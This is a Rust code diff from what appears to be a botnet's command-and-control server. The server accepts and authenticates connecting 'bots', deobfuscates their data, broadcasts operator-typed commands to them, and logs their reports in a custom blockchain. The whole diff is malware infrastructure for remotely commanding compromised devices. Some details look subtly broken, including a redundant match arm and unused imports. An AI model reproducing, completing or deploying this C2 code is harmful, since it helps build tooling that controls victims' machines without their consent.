@@ -15,28 +15,33 @@ use std::{
     slice,
     net::SocketAddr,
     process::Command,
-    ptr::slice_from_raw_parts,
-    str::{EscapeDebug, from_utf8},
+    str::{from_utf8},
     thread,
     net,
     future,
     error::Error,
     sync::mpsc,
     future::Future,
-    thread::JoinHandle
 };
+use std::ops::{Deref, DerefMut};
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
 use base32;
+use std::sync::{Arc, Mutex};
 use crate::{
     encoder,
-    communication::c2::{Bot, Device_stream},
-    communication::lib,
     encryption as enc,
     message as msg,
-    blockchain::blockchain
+    communication::{
+        c2::{Bot, Device_stream},
+        lib
+    },
+    blockchain::{
+        blockchain,
+        block::{Block, BlockData, BlockHeader, Genesis},
+        blockchain::Blockchain
+    }
 };
-use crate::blockchain::block::Block;
 use super::c2;
 
 const HQ: &str = "127.0.0.1:6969";
@@ -82,6 +87,7 @@ async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr)
     let data = handle_message_received(&mut DS, socket).await;
     if DS.connected {
         let encryption_key = msg::c2_bot_data_processing::deobfuscate_data(data, false, &DS.encryption_key);
+        DS.authenticated = true;
         DS.B = msg::c2_bot_data_processing::deserialize_rmp(encryption_key);
         DS.encryption_key = DS.B.com.data.clone();
     }
@@ -137,7 +143,7 @@ async fn handle_message_from_client(
 
 fn client_input (
     c2_tx: Sender<Vec<u8>>,
-) {
+) -> io::Result<()> {
     loop {
         println!("-> ");
         let mut buff = String::new();
@@ -147,26 +153,41 @@ fn client_input (
         buff.pop();
         c2_tx.send(buff.into_bytes()).unwrap(); // edode : Data has to be sent to the bots
     }
+    Ok(())
 }
 
 /// Receiving the data from the bot and sending it to the HQ
 async fn receive_bot_data(
     mut bot_rx: Receiver<c2::Device_stream>,
-) {
+    mut arc_Blkchain: Arc<Mutex<Blockchain>>,
+    mut arc_Blk: Arc<Mutex<Block>>,
+) -> io::Result<()> {
     loop {
         match bot_rx.try_recv() {
             Ok(mut received_data) => {
                 println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
-                println!("Sending Data to Commanding C2");
-                // edode : writing to blockchain
 
+                if let Ok(mut Blkchain) = arc_Blkchain.lock() {
+                    if let Ok(mut Blk) = arc_Blk.lock() { // lisandro : clearable
+                        let mut BH = Blk.header.clone();
+                        let mut BD = Blk.data.clone();
+                        BH.create_block_header(Blkchain.get_last_block_hash());
+                        BD.create_block_data(received_data);
+                        Blk.update_block(BH, BD);
+                        Blkchain.add_block(Blk.clone());
+                        println!("Block added to the blockchain");
+                    }
+                    println!("{:?}", Blkchain);
+                }
             },
             Err(err) => {
                 // edode : empty channel
                 //println!("Could not receive data : {}", err);
             },
+            _ => {}
         };
     }
+    Ok(())
 }
 
 #[tokio::main]
@@ -177,17 +198,28 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
     let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
 
     let mut Co: c2::Cohort = c2::Cohort::new();
-    let mut Blk: blockchain::Blockchain = blockchain::Blockchain::new();
-    // lisandro : make this more generic
-    let x = chn_c2_tx.clone();
+
+    let mut Blk: Block = Block::genesis_block();
+    let mut Blkchain: blockchain::Blockchain = blockchain::Blockchain::new(Blk.clone());
+
+    let Blkchain_arc = Arc::new(Mutex::new(Blkchain));
+    let Blk_arc = Arc::new(Mutex::new(Blk));
+
+    let c2_input_rx = chn_c2_tx.clone();
     thread::spawn(move || {
-        client_input(x);
+        client_input(c2_input_rx);
+    });
+
+    let mut bot_rx = chn_bot_tx.subscribe();
+    tokio::spawn(async move {
+        receive_bot_data(bot_rx, Blkchain_arc, Blk_arc).await;
     });
 
     println!("C2 Server Initialized");
     loop {
         // edode : Accepting the new bot
         let (socket, addr) = listener.accept().await?;
+
 
         println!("New user connected: {}", addr);
 
@@ -199,7 +231,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
         let mut co_clone = Co.C2_Stream.last().unwrap().clone();
 
-        let mut bot_rx = chn_bot_tx.subscribe();
+        //let mut bot_rx = chn_bot_tx.subscribe();
         let bot_tx = chn_bot_tx.clone();
 
         let mut c2_rx = chn_c2_tx.subscribe();
@@ -207,10 +239,6 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
 
         tokio::spawn(async move {
             handle_message_from_client(co_clone, bot_tx, c2_rx, socket).await;
-        });
-
-        tokio::spawn(async move {
-            receive_bot_data(bot_rx).await;
         });
     }
     Ok(())
